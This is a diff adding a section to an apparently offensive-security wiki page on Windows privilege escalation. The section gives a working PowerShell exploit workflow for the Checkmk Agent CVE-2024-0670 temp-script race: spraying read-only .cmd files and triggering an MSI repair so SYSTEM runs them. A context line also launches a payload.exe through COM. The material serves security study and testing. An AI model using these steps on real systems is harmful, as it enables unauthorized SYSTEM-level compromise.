@@ -241,6 +241,47 @@ $com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
 
 General takeaway: when reversing “helper” suites, do not stop at localhost TCP or named pipes. Check for COM classes with names such as `Elevator`, `Launcher`, `Updater`, or `Utility`, then verify whether the privileged service actually validates the target binary itself or merely trusts a result computed by a patchable user-mode client DLL. This pattern generalizes beyond Razer: any split design where the high-privilege broker consumes an allow/deny decision from the low-privilege side is a candidate privesc surface.
 
+
+---
+## Predictable temp script execution during MSI repair (Checkmk Agent / CVE-2024-0670)
+
+Some Windows agents still implement privileged actions by writing a temporary `.cmd` into `C:\Windows\Temp` and executing it as `SYSTEM`. If the filename is predictable and the service doesn't safely recreate existing files, a low-privileged user can pre-create the future temp file as **read-only** and make the privileged process execute attacker-controlled content instead of its own script.
+
+Observed in vulnerable Checkmk Agent builds:
+- temp pattern: `cmk_all_<PID>_1.cmd`
+- affected branches: `2.0.0`, `2.1.0`, `2.2.0`
+- trigger: MSI **repair** of the cached agent package
+
+Practical workflow:
+1. Estimate a realistic PID range from current process IDs or the running agent PID.
+2. Write a short **ASCII** `.cmd` payload (`Set-Content -Encoding Ascii` or `cmd.exe` redirection; avoid UTF-16 PowerShell output for batch files).
+3. Spray `C:\Windows\Temp\cmk_all_<PID>_1.cmd` across the candidate range and mark each file read-only.
+4. Trigger a repair of the cached MSI so the privileged service attempts to regenerate and then executes the temp script.
+
+```powershell
+Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
+1..10000 | ForEach-Object {
+  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
+  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
+}
+```
+
+If the vulnerable product is installed with Windows Installer, map the random-looking cached MSI under `C:\Windows\Installer` back to its product name before triggering the repair:
+
+```powershell
+Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
+  ForEach-Object {
+    $p = Get-ItemProperty $_.PSPath
+    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
+  } | Where-Object Name -like "*Check MK Agent*"
+
+msiexec /fa C:\Windows\Installer\<cached-agent>.msi
+```
+
+Operational notes:
+- `qwinsta` is useful when `msiexec /fa` fails from a non-interactive WinRM shell and you need to understand whether an existing desktop/disconnected session can trigger the repair correctly.
+- This pattern generalizes to other endpoint agents and updaters that **stage temp scripts in world-writable locations and later execute them as SYSTEM**. Test for predictable names, missing exclusive create semantics, and repair/update flows that can be triggered on demand.
+
 ---
 ## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)
 
@@ -298,6 +339,10 @@ These patterns generalize to any updater that accepts unsigned manifests or fail
 - [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
 - [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
 - [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
+- [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
+- [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
+- [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
+- [RunasCs](https://github.com/antonioCoco/RunasCs)
 - [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
 - [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
 - [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
